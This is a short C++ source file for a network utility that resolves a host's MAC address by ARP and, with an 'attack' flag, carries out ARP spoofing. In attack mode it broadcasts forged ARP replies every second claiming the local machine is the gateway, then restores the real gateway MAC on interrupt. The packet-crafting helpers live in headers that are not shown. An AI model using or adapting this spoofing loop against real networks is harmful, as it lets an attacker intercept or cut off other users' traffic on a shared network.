#include "utils/args.h"
#include "driver.h"
#include <signal.h>

std::atomic<bool> end_attack = false;

void onInterrupt(int) { end_attack = true; }

int main(int argc, char** argv)
{
    MY_TRY;
    utils::Args args(argc, argv);
    args.positional("ip4", utils::value<std::string>()->default_value("0.0.0.0"), "ip4 address", 1);
    args.optional("attack,a", utils::bool_switch(), "mobilize arp attack");
    args.parse();

    auto ip = net::Ip4::fromDottedDec(args.get<std::string>("ip4"));
    ILOG("ip4: {}", ip.toStr());
    net::Driver driver(ip);
    if (!args.get<bool>("attack")) {
        auto mac = driver.getMac(ip);
        if (!mac) {
            if (mac.error().timeout()) {
                ILOG("{} is offline", ip.toStr());
            } else {
                ELOG(mac.error().what());
            }
        } else {
            ILOG("{} is at {}", ip.toStr(), (*mac).toStr());
        }

    } else {
        signal(SIGINT, onInterrupt);
        auto& apt = driver.getAdaptor();
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            ILOG("gateway {} is at {}", apt.gateway.toStr(), gateway_mac->toStr());
        } else {
            ELOG(gateway_mac.error().what());
            return 1;
        }
        ILOG("pretending gateway's mac to {}...", apt.mac.toStr());
        auto lie = driver.broadcastedARP(apt.mac, apt.gateway, apt.mac, apt.ip, true);
        while (!end_attack) {
            driver.send(lie);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        ILOG("attack stopped");
        if (auto gateway_mac = driver.getMac(apt.gateway)) {
            auto truth = driver.broadcastedARP(*gateway_mac, apt.gateway, apt.mac, apt.ip, true);
            driver.send(truth);
            ILOG("gateway's mac restored to {}", gateway_mac->toStr());
        }
    }
    MY_CATCH;
}
